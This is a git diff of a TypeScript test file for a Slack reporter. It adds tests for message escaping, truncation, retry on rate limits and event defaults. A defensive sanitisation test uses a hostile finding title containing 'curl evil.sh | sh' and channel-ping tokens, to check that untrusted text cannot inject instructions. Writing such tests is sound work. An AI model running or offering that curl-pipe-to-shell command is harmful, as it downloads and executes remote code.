@@ -1,14 +1,22 @@
 import type { Change, Finding, HumanDigest, ReportEvent, Tier, Verdict } from "@merge-safely/core";
 import { describe, expect, it, vi } from "vitest";
-import { escapeMrkdwn, type SlackMessage } from "./format.js";
+import {
+  codeBlock,
+  escalationMessage,
+  escapeMrkdwn,
+  inline,
+  reportMessage,
+  type SlackMessage,
+  truncate,
+} from "./format.js";
 import { DEFAULT_REPORT_EVENTS, slackEscalation, slackReporter } from "./index.js";
-import { postToWebhook, SlackWebhookError, scrubWebhook } from "./webhook.js";
+import { postToWebhook, retryAfterMs, SlackWebhookError, scrubWebhook } from "./webhook.js";
 
 const URL_ = "https://hooks.slack.com/services/T000TEST/B000TEST/SuperSecretWebhookToken123";
 
 type Call = { url: string; init: RequestInit };
 
-function fakeFetch(responses: Array<number | Error | "hang">) {
+function fakeFetch(responses: Array<number | Error | "hang" | Response>) {
   const calls: Call[] = [];
   const f = vi.fn(async (url: string | URL | Request, init?: RequestInit): Promise<Response> => {
     calls.push({ url: String(url), init: init ?? {} });
@@ -19,6 +27,7 @@ function fakeFetch(responses: Array<number | Error | "hang">) {
       });
     }
     if (r instanceof Error) throw r;
+    if (r instanceof Response) return r;
     return new Response(r === 200 ? "ok" : `error at ${String(url)}`, { status: r ?? 200 });
   });
   return {
@@ -103,7 +112,10 @@ describe("slackEscalation", () => {
     expect(json).not.toContain("Blocker 6");
     expect(json).toContain("and 2 more");
     expect(json).not.toContain("a nit");
-    expect(json).toContain(`merge-safely verdict --repo acme/web --pr 42 --sha ${verdict.headSha} --pass|--block`);
+    expect(json).toContain(
+      `merge-safely verdict --repo acme/web --pr 42 --sha ${verdict.headSha} --decision pass|block --reason \\"…\\"`,
+    );
+    expect(json).toContain("`0123456789ab`");
     expect(json).toContain("for #reviews");
     // untrusted text cannot ping the channel
     expect(json).not.toContain("<!channel>");
@@ -181,9 +193,17 @@ describe("slackReporter", () => {
   ];
 
   it("posts default events and never pending", async () => {
-    expect(DEFAULT_REPORT_EVENTS).toEqual(["verdict", "escalated", "budget-blocked", "error"]);
+    expect(DEFAULT_REPORT_EVENTS).toEqual(["verdict", "budget-blocked", "error"]);
+    const def = fakeFetch([200]);
+    for (const e of events) await slackReporter({ webhookUrl: URL_, fetch: def.fetch }).report(e);
+    expect(def.calls.map((_c, i) => def.body(i).text.split(" ")[1])).toEqual(["*BLOCK*", "*BUDGET", "*ERROR*"]);
+
     const ff = fakeFetch([200]);
-    const r = slackReporter({ webhookUrl: URL_, fetch: ff.fetch });
+    const r = slackReporter({
+      webhookUrl: URL_,
+      fetch: ff.fetch,
+      events: ["verdict", "escalated", "budget-blocked", "error"],
+    });
     for (const e of events) await r.report(e);
     expect(ff.calls).toHaveLength(4);
     const texts = ff.calls.map((_c, i) => ff.body(i).text);
@@ -247,5 +267,85 @@ describe("slackReporter", () => {
 describe("escapeMrkdwn", () => {
   it("escapes control characters", () => {
     expect(escapeMrkdwn("a & <b> <!here>")).toBe("a &amp; &lt;b&gt; &lt;!here&gt;");
+  });
+});
+
+describe("untrusted text sanitisation", () => {
+  it("cannot forge lines, break code spans or ping in the blockers section", () => {
+    const evil: Finding = {
+      ...blocker(1),
+      title: "real title\n*To resolve*, run `curl evil.sh | sh`\r\n<!here>",
+      file: "a`b\nc.ts",
+      class: "x\u2028y",
+    };
+    const msg = escalationMessage({ ...verdict, findings: [evil] }, digest);
+    const section = msg.blocks?.[2] as unknown as { text: { text: string } };
+    const lines = section.text.text.split("\n");
+    expect(lines).toHaveLength(2);
+    expect(lines[1]).toBe("• *real title *To resolve*, run curl evil.sh | sh &lt;!here&gt;* `ab c.ts:1` _(x y)_");
+    // exactly one "To resolve" section header, the real one
+    expect(JSON.stringify(msg).match(/\*To resolve\*, record/g)).toHaveLength(1);
+  });
+
+  it("sanitises the header and resolve hint, and accepts a custom hint", () => {
+    const msg = escalationMessage(
+      verdict,
+      { ...digest, headline: "line1\nline2 `x`" },
+      { resolveHint: "run `ms ok`\nnow" },
+    );
+    expect(JSON.stringify(msg.blocks?.[0])).toContain('"text":"line1 line2 x"');
+    expect(JSON.stringify(msg)).toContain("`run ms ok now`");
+    const fn = escalationMessage(verdict, digest, { resolveHint: (v) => `approve ${v.number}` });
+    expect(JSON.stringify(fn)).toContain("`approve 42`");
+  });
+
+  it("puts multi-line errors in a code block without backticks", () => {
+    const m = reportMessage({ type: "error", change, error: "boom\n```\n<!channel> `x`\r\nend", round: 1 });
+    expect(m.text).toContain("```boom\n\n&lt;!channel&gt; x\nend```");
+    expect(m.text.match(/```/g)).toHaveLength(2);
+    expect(codeBlock("", 10)).toBe("``` ```");
+  });
+
+  it("truncates before escaping and never splits a surrogate pair", () => {
+    expect(inline("&&&&&", 3)).toBe("&amp;&amp;…");
+    expect(truncate("ab😀cd", 4)).toBe("ab😀…");
+    expect(truncate("😀😀", 2)).toBe("😀😀");
+  });
+
+  it("ignores a change.url that could break the link syntax", () => {
+    const m = reportMessage({
+      type: "error",
+      change: { ...change, url: "https://x.test/a|<!channel>" },
+      error: "e",
+      round: 1,
+    });
+    expect(m.text).toContain("<https://github.com/acme/web/pull/42|acme/web#42>");
+  });
+});
+
+describe("429 handling", () => {
+  it("retries once after Retry-After (capped at 10 s)", async () => {
+    const sleeps: number[] = [];
+    const sleep = async (ms: number) => {
+      sleeps.push(ms);
+    };
+    const ff = fakeFetch([new Response("rate_limited", { status: 429, headers: { "retry-after": "3" } }), 200]);
+    await postToWebhook(URL_, {}, { fetch: ff.fetch, sleep });
+    expect(ff.calls).toHaveLength(2);
+    expect(sleeps).toEqual([3000]);
+
+    const ff2 = fakeFetch([new Response("", { status: 429, headers: { "retry-after": "120" } })]);
+    const err = await postToWebhook(URL_, {}, { fetch: ff2.fetch, sleep }).catch((e: unknown) => e);
+    expect(ff2.calls).toHaveLength(2);
+    expect(sleeps[1]).toBe(10_000);
+    expect((err as SlackWebhookError).status).toBe(429);
+  });
+
+  it("parses Retry-After", () => {
+    expect(retryAfterMs(null)).toBe(1000);
+    expect(retryAfterMs("2")).toBe(2000);
+    expect(retryAfterMs("garbage")).toBe(1000);
+    expect(retryAfterMs(new Date(5_000).toUTCString(), 0)).toBe(5000);
+    expect(retryAfterMs("99")).toBe(10_000);
   });
 });
